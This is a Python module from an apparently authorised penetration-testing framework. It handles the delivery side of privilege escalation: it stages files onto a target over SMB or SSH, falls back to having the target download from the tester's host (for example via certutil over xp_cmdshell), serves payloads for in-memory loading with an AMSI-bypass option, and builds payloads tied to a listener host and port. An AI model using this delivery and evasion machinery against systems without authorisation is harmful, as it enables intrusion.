"""Getting bytes onto a target and running them — the delivery side of escalation.

:mod:`fieldkit.escalate` is the *pure walker*: it decides which vector to try next along
the classifier's fallback axis and never touches a target itself, taking ``fire``/``stage``/
``build`` callbacks instead. This module is the other half — the concrete implementations
of those callbacks, and the one place that knows *how* an artifact reaches a host:

* :func:`put` — ``--put-file`` over smb/ssh, falling back to **download-staging** (serve it
  locally, the target fetches over whatever exec transport exists — e.g. certutil over MSSQL
  ``xp_cmdshell``, where no put-file path exists at all). Shared by ``escalate`` and ``prep``.
* :class:`Provisioner` — one escalate run's delivery state: fire a vector (including the
  *serve-in-memory* delivery, where nothing lands on disk), stage arsenal artifacts, and
  build+stage :mod:`fieldkit.poc` artifacts with the arch-correction retry.

Everything still funnels through :func:`fieldkit.executor.execute`, so the capture-everything
and safety-gate rules hold unchanged: this module chooses *what* to run, never *whether* it
is allowed to.
"""
import os

from . import arsenal as arsenal_mod
from . import escalate as escalate_mod
from . import evasion as evasion_mod
from . import executor as executor_mod
from . import poc as poc_mod
from . import staging as staging_mod


def put(store, host, cred, local, remote, label, allow, cfg, *, on_event=None, run=None):
    """Get ``local`` onto the target at ``remote``; returns ``(ok, how)``.

    Tries ``--put-file`` (smb/ssh) first, then download-staging over the exec transport.
    ``how`` is ``"put-file"``/``"download"`` on success, else the reason it failed.
    ``run`` is the injected subprocess runner (tests pass a fake; None = the real one).
    """
    emit = on_event or (lambda _m: None)
    creates = [(f"{label} at {remote}", f"del {remote}")]
    res = executor_mod.execute(
        store, executor_mod.Action(
            host=host, cred=cred, command=None, label=label,
            safety="config-change", upload=(local, remote), creates=creates),
        allow=allow, on_event=emit, run=run)
    if not res.blocked and res.ok:
        return True, "put-file"

    def _exec(command):
        return executor_mod.execute(
            store, executor_mod.Action(
                host=host, cred=cred, command=command, label=label,
                safety="config-change", creates=creates),
            allow=allow, on_event=emit, run=run)

    dres = staging_mod.download_stage(host, local, remote, lhost=cfg.get("lhost"),
                                      execute=_exec, on_event=emit)
    if dres is None:
        return False, (res.blocked or "no file-transfer path") + \
            " — set `config set lhost=<ip>` to download-stage over the exec transport"
    if dres.blocked or not dres.ok:
        return False, dres.blocked or "download-staging failed"
    return True, "download"


class Provisioner:
    """The ``fire``/``stage``/``build`` callbacks for one :func:`fieldkit.escalate.escalate`
    run, plus the :class:`~fieldkit.executor.ExecResult` per vector (``results``) so the
    caller can link the captured proof step to the finding it produced.

    ``build_dir`` is where mid-loop built artifacts land attacker-side; ``on_event`` receives
    progress lines; ``run`` is the injected subprocess runner (tests pass a fake). Nothing
    here decides authorisation — ``allow`` is passed straight through to the executor's gate.
    """

    def __init__(self, store, host, cred, cfg, allow, *, build_dir, on_event=None, run=None):
        self.store = store
        self.host = host
        self.cred = cred
        self.cfg = cfg
        self.allow = allow
        self.build_dir = build_dir
        self.emit = on_event or (lambda _m: None)
        self.run = run
        self.results = {}

    # -- the one place a vector's command actually runs ------------------------

    def _run(self, vector, command):
        action = executor_mod.Action(
            host=self.host, cred=self.cred, command=command,
            label=f"escalate:{vector.key}", safety=vector.safety, shell=vector.shell)
        return executor_mod.execute(self.store, action, allow=self.allow,
                                    on_event=self.emit, run=self.run)

    def fire(self, vector):
        """Run ``vector``'s proof command, serving its in-memory payload if it has one."""
        serves = getattr(vector, "serves", ())
        res = self._fire_served(vector, serves) if serves else self._run(vector, vector.command)
        self.results[vector.key] = res
        return res

    def _fire_served(self, vector, serves):
        """In-memory delivery: serve the artifact(s) over HTTP for the life of the command
        and let the target load them from ``{url}``. Nothing lands on disk."""
        paths = [arsenal_mod.find(n) for n in serves]
        if not all(paths):
            missing = ", ".join(n for n, p in zip(serves, paths) if not p)
            return executor_mod.ExecResult(
                blocked=f"{missing} not in the arsenal — stage it to serve in-memory")
        lhost = self.cfg.get("lhost")
        if not lhost:
            return executor_mod.ExecResult(
                blocked="no lhost — `config set lhost=<ip>` so the target can pull the "
                        "in-memory payload")
        directory = os.path.dirname(paths[0])
        served = os.path.basename(paths[0])
        amsi = evasion_mod.amsi_prefix(self.cfg.get("amsi_bypass"))
        label = evasion_mod.amsi_label(self.cfg.get("amsi_bypass"))
        with staging_mod.serve(directory) as port:
            url = f"http://{lhost}:{port}/"
            self.emit(f"  serving {served} on {lhost}:{port} — target loads it in memory"
                      + (f"  (AMSI bypass: {label})" if label else ""))
            command = (vector.command.replace("{amsi}", amsi)
                       .replace("{url}", url).replace("{served}", served))
            return self._run(vector, command)

    # -- provisioning ----------------------------------------------------------

    def put(self, local, remote, label):
        return put(self.store, self.host, self.cred, local, remote, label,
                   self.allow, self.cfg, on_event=self.emit, run=self.run)

    def stage(self, vector):
        """Push every artifact ``vector`` declares in ``stages`` from the arsenal."""
        done = []
        for name, remote in vector.stages:
            local = arsenal_mod.find(name)
            if not local:
                return escalate_mod.StageResult(
                    False, f"{name} not in the arsenal — `fieldkit arsenal` to fetch it")
            ok, how = self.put(local, remote, f"stage:{name}")
            if not ok:
                return escalate_mod.StageResult(False, how)
            done.append(f"{name}→{remote} ({how})")
        return escalate_mod.StageResult(True, "staged " + ", ".join(done))

    def build(self, vector, corrected):
        """Build every artifact ``vector`` declares in ``builds`` and stage it.

        ``corrected`` is the loop's BAD_BUILD retry: flip the architecture and rebuild.
        """
        arch = "x86" if self.cfg.get("arch") == "x86" else "x64"
        done = []
        for fmt, remote, bcmd in vector.builds:
            use_arch = "x86" if (corrected and arch == "x64") else ("x64" if corrected else arch)
            out = os.path.join(self.build_dir, f"{vector.key.replace(':', '_')}.{fmt}")
            bres = poc_mod.build(fmt, out, arch=use_arch, command=bcmd,
                                 lhost=self.cfg.get("lhost"), lport=self.cfg.get("lport"))
            if not bres.ok:
                return escalate_mod.StageResult(False, bres.detail)
            ok, how = self.put(out, remote, f"build:{fmt}")
            if not ok:
                return escalate_mod.StageResult(False, how)
            done.append(f"{fmt}({bres.tool})→{remote} ({how})")
        return escalate_mod.StageResult(True, "built+staged " + ", ".join(done))


def record_proof(store, outcome, results, host):
    """Record the proven vector as a finding, linked to the step that proved it.

    Anti-fabrication: the captured proof step is attached to the finding, so a finding
    cannot render without the evidence that made it. Returns the finding id, or None.
    """
    if not outcome.ok:
        return None
    vector = outcome.proven
    vtype = vector.report_type or vector.key.split(":", 1)[0]
    res = results.get(vector.key)
    evidence = (getattr(res, "output", "") or "").strip()[:500]
    finding_id, _ = store.add_finding(vtype, vector.title, host_id=host["id"],
                                      proven=True, evidence=evidence)
    step_id = getattr(res, "step_id", None)
    if step_id is not None:
        store.attach_step(step_id, finding_id)
    if vector.cleanup:
        store.add_artifact(f"{vector.title} (artifact)", cleanup_cmd=vector.cleanup,
                           host_id=host["id"])
    return finding_id
